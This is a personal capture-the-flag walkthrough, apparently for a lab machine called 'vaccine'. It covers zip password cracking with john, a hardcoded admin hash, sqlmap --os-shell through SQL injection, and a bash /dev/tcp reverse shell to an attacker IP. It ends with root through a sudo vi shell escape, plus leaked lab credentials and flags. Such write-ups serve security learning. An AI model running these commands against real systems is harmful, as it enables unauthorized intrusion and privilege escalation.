@@ -1,0 +1,135 @@
+//ftp access as anonmous get us a backup.zip
+//password protected lets fire zip2ohn
+
+zip2john backup.zip > backup.john
+ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
+ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)
+1g 0:00:00:01 DONE (2021-10-28 21:38) 0.7936g/s 3250p/s 3250c/s 3250C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+password = 741852963
+
+//we get a php and css files
+//interresting part of the php file
+
+session_start();
+if(isset($_POST['username']) && isset($_POST['password'])) {
+	if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+		$_SESSION['login'] = "true";
+		header("Location: dashboard.php");
+		
+//web credentials:
+admin:qwerty789
+
+//after login we access dashboad wich is a search page with Sqli vulnerabilities
+//we fire sqlmap (put output in a separated file for easier readability)
+
+//we try to get shell adding --os-shell to previous command but
+[22:43:07] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported
+
+//ok I tried again with sudo and it worked
+//WORKS WITH SUDO
+┌─[nair0lf32@zer0ne]─[~]
+└──╼ $sudo sqlmap -u 'http://10.129.149.84/dashboard.php?search=a' --cookie='PHPSESSID=ibubfif67ebkdul9tlg4o9q1f9' --os-shell
+[sudo] Mot de passe de nair0lf32 : 
+___
+	---
+	[23:37:25] [INFO] the back-end DBMS is PostgreSQL
+	web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
+	web application technology: Apache 2.4.41
+	back-end DBMS: PostgreSQL
+	[23:37:26] [INFO] fingerprinting the back-end DBMS operating system
+	[23:37:27] [INFO] the back-end DBMS operating system is Linux
+	[23:37:27] [INFO] testing if current user is DBA
+	[23:37:28] [INFO] retrieved: '1'
+	[23:37:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+	[23:37:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+	os-shell> 
+	
+//Now we prepare nc to get a shell using a simple command:
+bash -c 'bash -i >& /dev/tcp/10.10.14.230/2311 0>&1'
+
+
+//and we are in
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+
+//exploring the /var/www/html folders we get source code of dashboard.php with hardcoded credentials
+
+<?php
+session_start();
+if($_SESSION['login'] !== "true") {
+	header("Location: index.php");
+	die();
+}
+try {
+	$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+}
+
+catch ( exception $e ) {
+	echo $e->getMessage();
+
+//creds:
+	postgres:P@s5w0rd!
+	
+	
+//The shell keeps dying after timeout we try to spawn a TTY
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+//didnt work
+//let's try to ssh with same credentials
+
+postgres@vaccine:~$ ls
+11  user.txt
+postgres@vaccine:~$ cat user.txt
+
+//FIST FLAG FOUND!
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+
+//THAT FCKING SHELL CONTINUE TO DIE..LETS RESTART IT ANYWAY FFS
+
+//time to privEsc
+
+//sudo (password reuse is a thing)
+sudo -l
+[sudo] password for postgres: P@s5w0rd!
+
+Matching Defaults entries for postgres on vaccine:
+env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+XFILESEARCHPATH XUSERFILESEARCHPATH",
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+mail_badpass
+
+User postgres may run the following commands on vaccine:
+(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+//ok we can run commands from vi so lets abuse this
+we run sudo vi /etc/postgresql/11/main/pg_hba.conf
+
+//once in vi we run
+:!/bin/bash
+
+
+//and we get a root shell
+root@vaccine:/var/lib/postgresql# cd /root
+root@vaccine:~# ls
+pg_hba.conf  root.txt  snap
+root@vaccine:~# cat root.txt
+
+//SECOND FLAG BABY 
+dd6e058e814260bc70e9bbdef2715849
+
+*found another file in root a postgres auth config file...copied content for later analysis
+*might be a way to get a persistent shell
+
+//root shell didnt die after timeout
